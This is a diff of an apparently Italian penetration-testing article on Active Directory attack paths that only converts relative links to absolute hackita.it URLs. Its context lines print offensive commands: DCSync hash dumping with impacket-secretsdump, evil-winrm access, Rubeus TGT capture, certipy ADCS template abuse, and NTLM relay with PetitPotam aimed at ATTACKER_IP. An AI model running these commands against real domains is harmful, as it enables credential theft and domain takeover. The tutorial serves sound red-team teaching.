@@ -272,7 +272,7 @@ Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attack
 impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
 ```
 
-→ Vedi [DCSync](/articoli/dcsync/)
+→ Vedi [DCSync](https://hackita.it/articoli/dcsync/)
 
 ### WriteOwner
 
@@ -296,8 +296,6 @@ evil-winrm -i SRV01 -u attacker -p 'Password'
 # Una volta dentro: dump credenziali sessione attiva
 ```
 
-→ Vedi [Pass-the-Hash](/articoli/pass-the-hash/) | [Mimikatz](/articoli/mimikatz/)
-
 ### DCSync Rights
 
 ```bash
@@ -305,7 +303,6 @@ impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
 ```
 
 Output: hash NTLM di tutti gli utenti incluso `krbtgt`. → Golden Ticket.
-→ Vedi [DCSync](/articoli/dcsync/) | [Kerberos](/articoli/kerberos/)
 
 ### Unconstrained Delegation
 
@@ -315,7 +312,7 @@ Rubeus.exe monitor /interval:5 /nowrap
 # Attendi/forza autenticazione DA → cattura TGT → Pass-the-Ticket
 ```
 
-→ Vedi [Rubeus](/articoli/rubeus/)
+→ Vedi [Rubeus](https://hackita.it/articoli/rubeus/)
 
 ### ReadLAPSPassword / AllExtendedRights
 
@@ -390,7 +387,7 @@ certipy req -u attacker@corp.local -p 'Password' -ca CA_NAME -template TEMPLATE_
 certipy auth -pfx administrator.pfx -dc-ip DC_IP
 ```
 
-→ Vedi [ESC1](/articoli/esc1-adcs/)
+→ Vedi [ESC1](https://hackita.it/articoli/esc1-adcs/)
 
 ### ESC4 — WriteProperty sul template
 
@@ -402,7 +399,7 @@ certipy template -u attacker@corp.local -p 'Password' -template TEMPLATE -save-o
 # Poi sfrutta come ESC1
 ```
 
-→ Vedi [ESC4](/articoli/esc4-adcs/)
+→ Vedi [ESC4](https://hackita.it/articoli/esc4-adcs/)
 
 ### ESC8 — NTLM Relay verso Web Enrollment
 
@@ -416,13 +413,13 @@ impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --t
 python3 PetitPotam.py ATTACKER_IP DC_IP
 ```
 
-→ Vedi [ESC8](/articoli/esc8-adcs/)
+→ Vedi [ESC8](https://hackita.it/articoli/esc8-adcs/)
 
 ### ESC13 — Group-Linked Template Abuse
 
 BloodHound CE mostra percorsi ESC13 quando un template è collegato a un gruppo che eredita permessi elevati.
 
-→ Vedi [ESC13](/articoli/esc13-adcs/)
+→ Vedi [ESC13](https://hackita.it/articoli/esc13-adcs/)
 
 ***
 
@@ -536,7 +533,7 @@ evil-winrm -i 10.10.10.20 -u j.smith -p 'Pass123!'
 
 **4. Dump credenziali sessione svc\_sql dalla macchina**
 
-→ Vedi [Mimikatz](/articoli/mimikatz/) | [Pass-the-Hash](/articoli/pass-the-hash/)
+→ Vedi [Mimikatz](https://hackita.it/articoli/mimikatz/) | [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
 
 **5. DCSync finale con svc\_sql (Domain Admin)**
 
